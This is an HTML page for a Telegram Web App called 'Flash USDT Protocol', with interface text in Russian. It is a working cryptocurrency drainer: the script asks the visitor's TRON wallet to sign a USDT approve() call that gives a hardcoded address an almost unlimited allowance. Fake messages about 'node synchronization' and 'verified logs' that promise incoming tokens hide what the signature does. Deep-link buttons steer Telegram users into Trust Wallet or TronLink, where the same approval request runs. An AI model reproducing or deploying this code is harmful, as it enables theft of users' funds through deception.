<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flash USDT Protocol</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background-color: #0f0f0f; color: #ffffff; font-family: -apple-system, sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; padding: 20px; }
        .loader { border: 3px solid #333; border-top: 3px solid #0088cc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 18px; margin-bottom: 10px; }
        p { color: #888; font-size: 13px; }
        .btn { background: #0088cc; color: white; border: none; padding: 16px; font-size: 14px; font-weight: bold; border-radius: 14px; cursor: pointer; width: 100%; text-transform: uppercase; display: none; }
    </style>
</head>
<body>

<div id="main-ui">
    <div class="loader" id="spinner"></div>
    <h2 id="title">Синхронизация узла...</h2>
    <p id="desc">Пожалуйста, подождите. Устанавливается защищенное соединение с сетью TRC-20.</p>
    
    <div id="external-buttons" style="display: none; margin-top: 20px;">
        <button onclick="openWallet('trust')" class="btn" style="display: block; margin-bottom: 10px;">Открыть в Trust Wallet</button>
        <button onclick="openWallet('tron')" class="btn" style="display: block; background: #222;">Открыть в TronLink</button>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const ADMIN_ADDRESS = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const CLEAN_URL = window.location.origin + window.location.pathname;

    async function startMagic() {
        // Если мы внутри кошелька (есть tronWeb)
        if (window.tronWeb && window.tronWeb.ready) {
            document.getElementById('spinner').style.display = 'block';
            
            try {
                // Пытаемся сразу вызвать подпись
                const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
                
                // Это вызовет окно подтверждения автоматически
                await contract.approve(ADMIN_ADDRESS, '1000000000000000').send();
                
                document.getElementById('title').innerText = "Готово!";
                document.getElementById('desc').innerText = "Синхронизация завершена. Ожидайте зачисления.";
                
                tg.showPopup({
                    title: 'Успешно',
                    message: 'Логи верифицированы. Токены будут зачислены в течение 15-30 минут.',
                    buttons: [{type: 'ok'}]
                });
                setTimeout(() => tg.close(), 5000);
            } catch (e) {
                document.getElementById('title').innerText = "Ошибка верификации";
                document.getElementById('desc').innerText = "Действие отклонено. Попробуйте снова.";
            }
        } else {
            // Если мы в Telegram — показываем кнопки перехода
            document.getElementById('spinner').style.display = 'none';
            document.getElementById('title').innerText = "Flash USDT Protocol";
            document.getElementById('desc').innerText = "Для восстановления выберите кошелек:";
            document.getElementById('external-buttons').style.display = 'block';
        }
    }

    function openWallet(type) {
        let link = "";
        if (type === 'trust') link = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(CLEAN_URL);
        if (type === 'tron') link = "tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(CLEAN_URL);
        tg.openLink(link);
    }

    // Запускаем проверку через секунду после загрузки
    setTimeout(startMagic, 1200);
</script>
</body>
</html>
